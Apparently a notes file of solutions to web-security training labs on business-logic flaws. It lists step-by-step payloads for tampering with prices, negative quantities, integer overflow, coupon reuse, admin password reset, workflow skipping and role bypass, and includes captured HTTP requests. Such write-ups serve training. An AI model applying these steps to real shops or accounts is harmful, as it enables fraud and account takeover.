
### Excessive trust in client-side controls
**Payload** :
`intercept request add to cart -> change the body request price to 1 -> forward`
```http
productId=1&redir=PRODUCT&quantity=1&price=1
```

### High-level logic vulnerability
**Payload** :
`intercept request add to cart -> try to change the quantity to minus -> it work -> add 1 item leather jacket -> add -20 item ZZZ bed -> checkout`

### Flawed enforcement of business rules
**Payload** :
`try to subcription on newsletter, you will get coupon -> try to add both coupun -> it's like the system will check first used coupon -> repeat`

### Inconsistent security controls
**Payload** :
`Register with username DontWannaCry, with client email -> login -> change email with domain @dontwannacry.com -> go to admin panel -> delete carlos`

### Low-level logic flaw
**Payload** :
`Add item Leather with quantity 99 -> repeat, realize that you can add with unlimited quantity -> data type int has limit 2,147,483,647 -> so add the item until it become -2,147,483,647 -> add more item until it positive with range $0 - $100 `

### Weak isolation on dual-use endpoint
**Payload** :
`Log in as wiener -> reset password -> intercept the request -> change value 'username' to administrator -> remove parameter 'current-password' -> send the request -> log in as administrator with new password`

```http
POST /my-account/change-password HTTP/2
Host: 0a7900e30367d3c682f23951003a0039.web-security-academy.net
Cookie: session=Wm2nkWv6u5T1BlzCRcbIgif4JMZSs4C2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 102
Origin: https://0a7900e30367d3c682f23951003a0039.web-security-academy.net
Dnt: 1
Referer: https://0a7900e30367d3c682f23951003a0039.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

csrf=ln6gy4dbyFmJDooIXfm0OKqgCgToF9K6&username=administrator&new-password-1=abcde&new-password-2=abcde
```

### Insufficient workflow validation
**Payload** :
`try every step include the success order -> capture every packet into repeater -> capture packet order-confirmation -> add item leather jacket -> send packet order-confirmation`

```http
GET /cart/order-confirmation?order-confirmed=true HTTP/2
Host: 0acd002a0318cc5c831d439c00bd0070.web-security-academy.net
Cookie: session=l3bTfIPt2IWSwWpmMSw76SYSP1lqT7LY
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Origin: https://0acd002a0318cc5c831d439c00bd0070.web-security-academy.net
Dnt: 1
Referer: https://0acd002a0318cc5c831d439c00bd0070.web-security-academy.net/cart/checkout
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

### Authentication bypass via flawed state machine
**Payload** :
`Login as wiener -> reliazed that after login, it redirect to '/role-selector' -> copy session from response before redirected -> paste the session and try the homepage -> reliazed the admin panel is appear -> delete carlos`

### Infinite money logic flaw
**Payload** :
`Login as wiener -> reliazed that there is a form to submit gift card -> on the homepage there's item that sell gift card -> try to subscribe newslatter to get discount coupon -> buy gift card as many possible as long as the credit is enough, don't forget to use coupon -> repeat buy gift card until the credit is enough to buy leather jacket`

